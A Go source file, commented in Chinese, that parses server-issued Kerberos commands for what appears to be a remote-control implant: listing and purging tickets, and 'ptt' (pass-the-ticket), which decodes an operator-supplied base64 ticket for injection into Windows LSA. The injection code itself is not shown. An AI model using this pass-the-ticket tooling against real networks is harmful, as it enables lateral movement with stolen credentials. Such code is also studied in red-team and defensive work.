package services

// Kerberos 票据动作命令（`kerberos list|purge|ptt <base64>`）的跨平台入口。
//
// 采集（kind=ticket）与动作是两条线：采集走制品管线回传，动作用命令回显。
// 动作只在 Windows 上可用（LSA）；解析逻辑放这里是为了能在 Linux 上单测。

import (
	"encoding/base64"
	"errors"
	"fmt"
	"strings"
)

const (
	kerberosActionList  = "list"
	kerberosActionPurge = "purge"
	kerberosActionPTT   = "ptt"

	// maxPTTBlob 单张 kirbi 的上限（正常 1~8KB；64KB 是三个数量级余量）
	maxPTTBlob = 64 << 10
)

// kerberosAction 解析后的动作
type kerberosAction struct {
	Kind string // list | purge | ptt
	Arg  string // purge：服务名（空=全部）；ptt：base64 的 KRB_CRED
	Blob []byte // ptt：解码后的 kirbi 字节
}

// parseKerberosAction 解析 cmdBuf（服务端下发的是 `kerberos ` 之后的部分）。
func parseKerberosAction(cmdBuf []byte) (kerberosAction, error) {
	fields := strings.Fields(string(cmdBuf))
	if len(fields) == 0 {
		return kerberosAction{Kind: kerberosActionList}, nil
	}
	switch strings.ToLower(fields[0]) {
	case "list":
		if len(fields) != 1 {
			return kerberosAction{}, errors.New("用法: kerberos list")
		}
		return kerberosAction{Kind: kerberosActionList}, nil
	case "purge":
		if len(fields) > 2 {
			return kerberosAction{}, errors.New("用法: kerberos purge [服务名]（不带服务名=清空全部）")
		}
		act := kerberosAction{Kind: kerberosActionPurge}
		if len(fields) == 2 {
			act.Arg = fields[1]
		}
		return act, nil
	case "ptt":
		if len(fields) != 2 {
			return kerberosAction{}, errors.New("用法: kerberos ptt <base64 的 kirbi/KRB_CRED>")
		}
		raw, err := decodeBase64Loose(fields[1])
		if err != nil {
			return kerberosAction{}, fmt.Errorf("ptt: base64 解码失败: %w", err)
		}
		if len(raw) == 0 {
			return kerberosAction{}, errors.New("ptt: 票据为空")
		}
		if len(raw) > maxPTTBlob {
			return kerberosAction{}, fmt.Errorf("ptt: 票据过大（%d > %d 字节）", len(raw), maxPTTBlob)
		}
		return kerberosAction{Kind: kerberosActionPTT, Blob: raw}, nil
	default:
		return kerberosAction{}, errors.New("用法: kerberos list|purge [服务名]|ptt <base64>")
	}
}

// decodeBase64Loose 兼容标准/URL 安全、带/不带 padding 的 base64
// （操作员从不同工具复制出来的编码不一定规范）。
func decodeBase64Loose(s string) ([]byte, error) {
	encs := []*base64.Encoding{
		base64.StdEncoding, base64.RawStdEncoding,
		base64.URLEncoding, base64.RawURLEncoding,
	}
	var lastErr error
	for _, enc := range encs {
		if raw, err := enc.DecodeString(s); err == nil {
			return raw, nil
		} else {
			lastErr = err
		}
	}
	return nil, lastErr
}

// CmdKerberosAction 票据动作入口（Windows 实现见 kerberos_action_windows.go）
func CmdKerberosAction(cmdBuf []byte) ([]byte, error) {
	act, err := parseKerberosAction(cmdBuf)
	if err != nil {
		return nil, err
	}
	return runKerberosAction(act)
}
